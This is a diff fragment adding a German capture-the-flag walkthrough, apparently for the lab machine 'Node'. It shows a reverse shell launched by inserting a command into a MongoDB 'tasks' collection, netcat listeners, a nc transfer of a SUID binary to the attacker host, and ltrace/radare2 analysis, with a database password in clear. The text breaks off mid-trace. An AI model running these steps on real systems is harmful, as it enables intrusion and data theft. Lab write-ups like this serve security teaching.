+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">})</span>;
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>error<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>        console.log<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;Something went wrong: &#39;</span> + error<span style="color:#f92672">)</span>;
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">})</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">}</span>, 30000<span style="color:#f92672">)</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">})</span>;
+</span></span></code></pre></div><p><strong>app.js</strong> sucht in der Datenbank <strong>tasks</strong> nach Einträgen (Zeile 15)  und führt den Inhalt in <strong>cmd</strong> als Shellbefehl aus (Zeile 19-21).</p>
+<p>Da wir die Anmeldedaten für die Datenbank haben und somit neue Einträge machen können, können wir dafür sorgen, dass z.B. ein Reverse Shell Skript ausgeführt wird.</p>
+<p>Ich benutze dieses <a href="https://github.com/appsecco/vulnerable-apps/tree/master/node-reverse-shell#the-nodejs-reverse-shell">NodeJS Reverse Shell Skript</a> dafür.</p>
+<p>Als nächstes nur noch NetCat Port 4444 abhören lassen und IP Adresse und Port im Skript dementsprechend ändern.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>root@kali:~# nc -lnvp <span style="color:#ae81ff">4444</span>
+</span></span></code></pre></div><p>Unter /tmp/ können wir das Skript dann mithilfe von VI(M) einfügen.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>mark@node:~$ vi /tmp/reverse.js
+</span></span></code></pre></div><p>Nun können wir uns mit der Datenbank verbinden.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>mark@node:~$ mongo -u mark -p 5AYRft73VtFpc84k localhost:27017/scheduler
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Failed global initialization: BadValue Invalid or no user locale set. Please ensure LANG and/or LC_* environment variables are set correctly.
+</span></span></code></pre></div><p>Wenn du diese Fehlermeldung bekommen solltest benutze folgendes.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>mark@node:~$ export LC_ALL<span style="color:#f92672">=</span>C
+</span></span></code></pre></div><p>So. 2. Versuch.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>mark@node:~$ mongo -u mark -p 5AYRft73VtFpc84k localhost:27017/scheduler
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&gt; db.tasks.insert<span style="color:#f92672">({</span>cmd: <span style="color:#e6db74">&#34;/usr/bin/node /tmp/reverse.js&#34;</span><span style="color:#f92672">})</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;acknowledged&#34;</span> : true,
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;insertedId&#34;</span> : ObjectId<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;5a8d1e6cf84b3aa4294de40d&#34;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+</span></span></code></pre></div><p>Durch <strong>db.tasks.insert({cmd: &ldquo;/usr/bin/node /tmp/reverse.js&rdquo;})</strong> machen wir einen neuen Eintrag in der Datenbank <strong>tasks</strong>. <strong>cmd</strong>bekommt dabei den Wert <strong>/usr/bin/node /tmp/reverse.js</strong>, welcher dafür sorgt, dass node unser Reverse Shell Skript ausführt. Zeile 4-6 ist die Bestätigung, dass der Eintrag erfolgreich war.</p>
+<p>Jetzt nur noch ein wenig warten, bis unser Eintrag ausgeführt wurde und wir haben Zugriff als <strong>tom</strong>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>tom@node:/$
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>tom@node:/$ find / -perm -u<span style="color:#f92672">=</span>s 2&gt;/dev/null
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/usr/lib/eject/dmcrypt-get-device
+</span></span><span style="display:flex;"><span>/usr/lib/snapd/snap-confine
+</span></span><span style="display:flex;"><span>/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+</span></span><span style="display:flex;"><span>/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+</span></span><span style="display:flex;"><span>/usr/lib/openssh/ssh-keysign
+</span></span><span style="display:flex;"><span>/usr/lib/policykit-1/polkit-agent-helper-1
+</span></span><span style="display:flex;"><span>/usr/local/bin/backup
+</span></span><span style="display:flex;"><span>/usr/bin/chfn
+</span></span><span style="display:flex;"><span>/usr/bin/at
+</span></span><span style="display:flex;"><span>/usr/bin/gpasswd
+</span></span><span style="display:flex;"><span>/usr/bin/newgidmap
+</span></span><span style="display:flex;"><span>/usr/bin/chsh
+</span></span><span style="display:flex;"><span>/usr/bin/sudo
+</span></span><span style="display:flex;"><span>/usr/bin/pkexec
+</span></span><span style="display:flex;"><span>/usr/bin/newgrp
+</span></span><span style="display:flex;"><span>/usr/bin/passwd
+</span></span><span style="display:flex;"><span>/usr/bin/newuidmap
+</span></span><span style="display:flex;"><span>/bin/ping
+</span></span><span style="display:flex;"><span>/bin/umount
+</span></span><span style="display:flex;"><span>/bin/fusermount
+</span></span><span style="display:flex;"><span>/bin/ping6
+</span></span><span style="display:flex;"><span>/bin/ntfs-3g
+</span></span><span style="display:flex;"><span>/bin/su
+</span></span><span style="display:flex;"><span>/bin/mount
+</span></span></code></pre></div><p><strong>find / -perm -u=s</strong> durchsucht alle Dateien, nach welchen die von jedem Benutzer ausgeführt werden können und dann die effektive UID des Benutzers der Datei haben. Mehr Informationen dazu kannst du <a href="http://www.zettel-it.de/docs/SUID-SGID-und-Sticky-Bit.pdf">hier</a> finden. <strong>2&gt;/dev/null</strong> sorgt einfach dafür, dass alle Fehlermeldungen (z.B. bei Zugriff verweigert) zu <a href="https://de.wikipedia.org/wiki//dev/null">/dev/null</a> umgeleitet werden. <a href="https://de.wikipedia.org/wiki//dev/null">/dev/null</a> verwirft jegliche Daten, die dorthin geschrieben werden.</p>
+<p><strong>/usr/local/bin/backup</strong> sieht unüblich aus.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>tom@node:/$ cd  /usr/local/bin
+</span></span><span style="display:flex;"><span>tom@node:/usr/local/bin$ file backup
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>backup: setuid ELF 32-bit LSB exeutable, Intel 80386, version <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>SYSV<span style="color:#f92672">)</span>, dynamically linked, interpreter  /lib/ld-linux.so.2,  <span style="color:#66d9ef">for</span> GNU/Linux 2.6.32, BuildID<span style="color:#f92672">[</span>sha1<span style="color:#f92672">]=</span>343cf2d93fb2905848a42007439494a2b4984369,  not stripped
+</span></span></code></pre></div><p>**/usr/local/bin/backup **ist eine <a href="https://de.wikipedia.org/wiki/Executable_and_Linking_Format">ELF</a> Datei.</p>
+<p>Laden wir uns die Datei herunter um sie uns genauer ansehen zu können.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>root@kali:~# nc -lnvp <span style="color:#ae81ff">8888</span> &gt; backup
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>root@kali:~# ifconfig tun0
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>inet 10.10.14.52 netmask 255.255.254.0 destination 10.10.14.52
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>tom@node:/usr/local/bin$ nc 10.10.14.52 <span style="color:#ae81ff">8888</span> &lt; backup
+</span></span></code></pre></div><p>Mit <a href="https://en.wikipedia.org/wiki/Ltrace">ltrace</a> können wir das Programm debuggen.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>root@kali:~# chmod +x backup
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>root@kali:~# ltrace ./backup
+</span></span><span style="display:flex;"><span>__libc_start_main<span style="color:#f92672">(</span>0x80489fd, 1, 0xffb9ac24, 0x80492c0 &lt;unfinished ...&gt;
+</span></span><span style="display:flex;"><span>geteuid<span style="color:#f92672">()</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>setuid<span style="color:#f92672">(</span>0<span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>exit<span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> &lt;no <span style="color:#66d9ef">return</span> ...&gt;
+</span></span><span style="display:flex;"><span>+++ exited <span style="color:#f92672">(</span>status 1<span style="color:#f92672">)</span> +++
+</span></span></code></pre></div><p>Das Programm beendet mit dem **Status  1 **und macht sonst nichts nennenswertes. Benutzen wir <a href="https://en.wikipedia.org/wiki/Radare2">radare2</a> um uns den Assembly Source Code anzusehen.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>root@kali:~# r2 backup
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>0x08048780<span style="color:#f92672">]</span>&gt; aaa
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>x<span style="color:#f92672">]</span> Analyze all flags starting with sym. and entry0 <span style="color:#f92672">(</span>aa<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>x<span style="color:#f92672">]</span> Analyze len bytes of instructions <span style="color:#66d9ef">for</span> references <span style="color:#f92672">(</span>aar<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>x<span style="color:#f92672">]</span> Analyze <span style="color:#66d9ef">function</span> calls <span style="color:#f92672">(</span>aac<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>x<span style="color:#f92672">]</span> Use -AA or aaaa to perform additional experimental analysis.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>x<span style="color:#f92672">]</span> Constructing a <span style="color:#66d9ef">function</span> name <span style="color:#66d9ef">for</span> fcn.* and sym.func.* functions <span style="color:#f92672">(</span>aan<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>0x08048780<span style="color:#f92672">]</span>&gt; afl
+</span></span><span style="display:flex;"><span>0x080485a8 <span style="color:#ae81ff">3</span> <span style="color:#ae81ff">35</span> sym._init
+</span></span><span style="display:flex;"><span>0x080485e0 <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">6</span> sym.imp.strstr
+</span></span><span style="display:flex;"><span>0x080485f0 <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">6</span> sym.imp.strcmp
+</span></span><span style="display:flex;"><span>0x08048600 <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">6</span> sym.imp.printf
+</span></span><span style="display:flex;"><span>0x08048610 <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">6</span> sym.imp.strcspn
+</span></span><span style="display:flex;"><span>0x08048620 <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">6</span> sym.imp.fgets
+</span></span><span style="display:flex;"><span>0x08048630 <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">6</span> sym.imp.fclose
+</span></span><span style="display:flex;"><span>0x08048640 <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">6</span> sym.imp.time
+</span></span><span style="display:flex;"><span>0x08048650 <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">6</span> sym.imp.geteuid
+</span></span><span style="display:flex;"><span>0x08048660 <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">6</span> sym.imp.strcat
+</span></span><span style="display:flex;"><span>0x08048670 <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">6</span> sym.imp.strcpy
+</span></span><span style="display:flex;"><span>0x08048680 <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">6</span> sym.imp.getpid
+</span></span><span style="display:flex;"><span>0x08048690 <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">6</span> sym.imp.puts
+</span></span><span style="display:flex;"><span>0x080486a0 <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">6</span> sym.imp.system
+</span></span><span style="display:flex;"><span>0x080486b0 <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">6</span> sym.imp.clock
+</span></span><span style="display:flex;"><span>0x080486c0 <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">6</span> sym.imp.exit
+</span></span><span style="display:flex;"><span>0x080486d0 <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">6</span> sym.imp.srand
+</span></span><span style="display:flex;"><span>0x080486e0 <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">6</span> sym.imp.strchr
+</span></span><span style="display:flex;"><span>0x080486f0 <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">6</span> sym.imp.__libc_start_main
+</span></span><span style="display:flex;"><span>0x08048700 <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">6</span> sym.imp.fopen
+</span></span><span style="display:flex;"><span>0x08048710 <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">6</span> sym.imp.strncpy
+</span></span><span style="display:flex;"><span>0x08048720 <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">6</span> sym.imp.rand
+</span></span><span style="display:flex;"><span>0x08048730 <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">6</span> sym.imp.access
+</span></span><span style="display:flex;"><span>0x08048740 <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">6</span> sym.imp.setuid
+</span></span><span style="display:flex;"><span>0x08048750 <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">6</span> sym.imp.sprintf
+</span></span><span style="display:flex;"><span>0x08048760 <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">6</span> sym.imp.remove
+</span></span><span style="display:flex;"><span>0x08048770 <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">6</span> sub.__gmon_start___252_770
+</span></span><span style="display:flex;"><span>0x08048780 <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">33</span> entry0
+</span></span><span style="display:flex;"><span>0x080487b0 <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">4</span> sym.__x86.get_pc_thunk.bx
+</span></span><span style="display:flex;"><span>0x080487c0 <span style="color:#ae81ff">4</span> <span style="color:#ae81ff">43</span> sym.deregister_tm_clones
+</span></span><span style="display:flex;"><span>0x080487f0 <span style="color:#ae81ff">4</span> <span style="color:#ae81ff">53</span> sym.register_tm_clones
+</span></span><span style="display:flex;"><span>0x08048830 <span style="color:#ae81ff">3</span> <span style="color:#ae81ff">30</span> sym.__do_global_dtors_aux
+</span></span><span style="display:flex;"><span>0x08048850 <span style="color:#ae81ff">4</span> <span style="color:#ae81ff">43</span> -&gt; <span style="color:#ae81ff">40</span> entry1.init
+</span></span><span style="display:flex;"><span>0x0804887b <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">197</span> sym.mix
+</span></span><span style="display:flex;"><span>0x08048940 <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">63</span> sym.displayWarning
+</span></span><span style="display:flex;"><span>0x0804897f <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">63</span> sym.displaySuccess
+</span></span><span style="display:flex;"><span>0x080489be <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">63</span> sym.displayTarget
+</span></span><span style="display:flex;"><span>0x080489fd <span style="color:#ae81ff">50</span> <span style="color:#ae81ff">2237</span> sym.main
+</span></span><span style="display:flex;"><span>0x080492c0 <span style="color:#ae81ff">4</span> <span style="color:#ae81ff">93</span> sym.__libc_csu_init
+</span></span><span style="display:flex;"><span>0x08049320 <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">2</span> sym.__libc_csu_fini
+</span></span><span style="display:flex;"><span>0x08049324 <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">20</span> sym._fini
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>0x08048780<span style="color:#f92672">]</span>&gt; vvv
+</span></span></code></pre></div><p>Nachdem wir <strong>aaa</strong> (analysiere alles), <strong>afl</strong> (liste alle Funktionen auf) und dann <strong>vvv</strong> (gehe in den Visuellen Modus) eingegeben haben, sehen wir folgendes.</p>
+<p><a href="https://imgur.com/QfUQFIz"><img src="https://imgur.com/QfUQFIz.jpg" alt="radare2"></a></p>
+<p>Wählen wir nun <strong>sym.main</strong> mit Hilfe der Pfeiltasten aus. Jetzt 2x <strong>g</strong> drücken und dann <strong>Leertaste</strong>. Wenn wir nun etwas runtergehen sehen wir folgendes.</p>
+<p><a href="https://imgur.com/bI8gzC0"><img src="https://imgur.com/bI8gzC0.jpg" alt="radare2"></a></p>
+<p><strong>cmp dword [ebx], 3</strong> ( Das Register <strong>ebc</strong> wird mit dem Wert <strong>3</strong> verglichen )<br>
+<strong>jg 0x8048a44;[gc]</strong> ( Wenn <strong>ebx größer oder gleich 3</strong> ist, wird das Programm weiter ausgeführt, ansonsten wird es beendet.)</p>
+<p>Eventuell möchte das Programm 3 (oder mehr) Argumente haben.</p>
+<p>( Mit <strong>q</strong> kannst du radare2 wieder beenden )</p>
+<p>Probieren wir nun das Programm mit 3 Argumenten aus.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>root@kali:~# ltrace ./backup arg1 arg2 arg3
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>__libc_start_main<span style="color:#f92672">(</span>0x80489fd, 4, 0xffa26dc4, 0x80492c0 &lt;unfinished ...&gt;
+</span></span><span style="display:flex;"><span>geteuid<span style="color:#f92672">()</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>setuid<span style="color:#f92672">(</span>0<span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>strcmp<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;arg1&#34;</span>, <span style="color:#e6db74">&#34;-q&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>strncpy<span style="color:#f92672">(</span>0xffab3ad8, <span style="color:#e6db74">&#34;arg2&#34;</span>, 100<span style="color:#f92672">)</span> <span style="color:#f92672">=</span> 0xffab3ad8
+</span></span><span style="display:flex;"><span>strcpy<span style="color:#f92672">(</span>0xffab3ac1, <span style="color:#e6db74">&#34;/&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">=</span> 0xffab3ac1
+</span></span><span style="display:flex;"><span>strcpy<span style="color:#f92672">(</span>0xffab3acd, <span style="color:#e6db74">&#34;/&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">=</span> 0xffab3acd
+</span></span><span style="display:flex;"><span>strcpy<span style="color:#f92672">(</span>0xffab3a57, <span style="color:#e6db74">&#34;/e&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">=</span> 0xffab3a57
+</span></span><span style="display:flex;"><span>strcat<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/e&#34;</span>, <span style="color:#e6db74">&#34;tc&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/etc&#34;</span>
+</span></span><span style="display:flex;"><span>strcat<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/etc&#34;</span>, <span style="color:#e6db74">&#34;/m&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/etc/m&#34;</span>
+</span></span><span style="display:flex;"><span>strcat<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/etc/m&#34;</span>, <span style="color:#e6db74">&#34;yp&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/etc/myp&#34;</span>
+</span></span><span style="display:flex;"><span>strcat<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/etc/myp&#34;</span>, <span style="color:#e6db74">&#34;la&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/etc/mypla&#34;</span>
+</span></span><span style="display:flex;"><span>strcat<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/etc/mypla&#34;</span>, <span style="color:#e6db74">&#34;ce&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/etc/myplace&#34;</span>
+</span></span><span style="display:flex;"><span>strcat<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/etc/myplace&#34;</span>, <span style="color:#e6db74">&#34;/k&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/etc/myplace/k&#34;</span>
+</span></span><span style="display:flex;"><span>strcat<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/etc/myplace/k&#34;</span>, <span style="color:#e6db74">&#34;ey&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/etc/myplace/key&#34;</span>
+</span></span><span style="display:flex;"><span>strcat<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/etc/myplace/key&#34;</span>, <span style="color:#e6db74">&#34;s&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/etc/myplace/keys&#34;</span>
+</span></span><span style="display:flex;"><span>fopen<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/etc/myplace/keys&#34;</span>, <span style="color:#e6db74">&#34;r&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>strcpy<span style="color:#f92672">(</span>0xffab26a8, <span style="color:#e6db74">&#34;Could not open file\n\n&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">=</span> 0xffab26a8
+</span></span><span style="display:flex;"><span>printf<span style="color:#f92672">(</span><span style="color:#e6db74">&#34; %s[!]%s %s\n&#34;</span>, <span style="color:#e6db74">&#34;\033[33m&#34;</span>, <span style="color:#e6db74">&#34;\033[37m&#34;</span>, <span style="color:#e6db74">&#34;Could not open file\n\n&#34;</span> <span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Could not open file
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">37</span>
+</span></span><span style="display:flex;"><span>exit<span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> &lt;no <span style="color:#66d9ef">return</span> ...&gt;
+</span></span><span style="display:flex;"><span>+++ exited <span style="color:#f92672">(</span>status 1<span style="color:#f92672">)</span> +++
+</span></span></code></pre></div><p>In Zeile 6 wird das erste Argument mit <strong>-q</strong> verglichen ( <strong>strcmp(&ldquo;arg1&rdquo;, &ldquo;-q&rdquo;) = 1</strong> ). Testen wir das aus.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>root@kali:~# ltrace ./backup -q arg2 arg3
+</span></span><span style="display:flex;"><span>__libc_start_main<span style="color:#f92672">(</span>0x80489fd, 4, 0xffb8b344, 0x80492c0 &lt;unfinished ...&gt;
+</span></span><span style="display:flex;"><span>geteuid<span style="color:#f92672">()</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>setuid<span style="color:#f92672">(</span>0<span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>strcmp<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;-q&#34;</span>, <span style="color:#e6db74">&#34;-q&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>strncpy<span style="color:#f92672">(</span>0xffb8b208, <span style="color:#e6db74">&#34;arg2&#34;</span>, 100<span style="color:#f92672">)</span> <span style="color:#f92672">=</span> 0xffb8b208
+</span></span><span style="display:flex;"><span>strcpy<span style="color:#f92672">(</span>0xffb8b1f1, <span style="color:#e6db74">&#34;/&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">=</span> 0xffb8b1f1
+</span></span><span style="display:flex;"><span>strcpy<span style="color:#f92672">(</span>0xffb8b1fd, <span style="color:#e6db74">&#34;/&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">=</span> 0xffb8b1fd
+</span></span><span style="display:flex;"><span>strcpy<span style="color:#f92672">(</span>0xffb8b187, <span style="color:#e6db74">&#34;/e&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">=</span> 0xffb8b187
+</span></span><span style="display:flex;"><span>strcat<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/e&#34;</span>, <span style="color:#e6db74">&#34;tc&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/etc&#34;</span>
+</span></span><span style="display:flex;"><span>strcat<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/etc&#34;</span>, <span style="color:#e6db74">&#34;/m&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/etc/m&#34;</span>
+</span></span><span style="display:flex;"><span>strcat<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/etc/m&#34;</span>, <span style="color:#e6db74">&#34;yp&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/etc/myp&#34;</span>
+</span></span><span style="display:flex;"><span>strcat<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/etc/myp&#34;</span>, <span style="color:#e6db74">&#34;la&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/etc/mypla&#34;</span>
+</span></span><span style="display:flex;"><span>strcat<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/etc/mypla&#34;</span>, <span style="color:#e6db74">&#34;ce&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/etc/myplace&#34;</span>
+</span></span><span style="display:flex;"><span>strcat<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/etc/myplace&#34;</span>, <span style="color:#e6db74">&#34;/k&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/etc/myplace/k&#34;</span>
+</span></span><span style="display:flex;"><span>strcat<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/etc/myplace/k&#34;</span>, <span style="color:#e6db74">&#34;ey&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/etc/myplace/key&#34;</span>
+</span></span><span style="display:flex;"><span>strcat<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/etc/myplace/key&#34;</span>, <span style="color:#e6db74">&#34;s&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/etc/myplace/keys&#34;</span>
+</span></span><span style="display:flex;"><span>fopen<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/etc/myplace/keys&#34;</span>, <span style="color:#e6db74">&#34;r&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
